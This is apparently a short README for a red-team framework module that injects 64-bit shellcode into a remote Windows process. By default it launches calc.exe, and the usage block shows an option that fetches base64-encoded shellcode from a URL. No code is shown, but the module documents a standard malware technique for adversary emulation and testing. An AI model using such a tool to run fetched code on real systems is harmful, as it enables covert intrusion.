# Simple Processs Injection

Performs a simple remote process injection of 64-bit shellcode. Windows calc.exe will run by default or URL parameter can point to base64 encoded custom shellcode file. 

## Credits and References

Author: Joff Thyer

Operating System(s): Windows

## Installation

Please reference our module [installation guide](https://github.com/scythe-io/community-modules/wiki) on the wiki.

##  Manual

```
usage: process_inject_method1 [-h] [-u URL]
Inject shellcode into memory
optional arguments:
  -h, --help         show this help message and exit
  -u URL, --url URL  URL to GET base64 encoded shellcode from
rivergumsecurity.process_inject_method1 --url <shellcode URL>
```

## FAQ:

No questions yet!
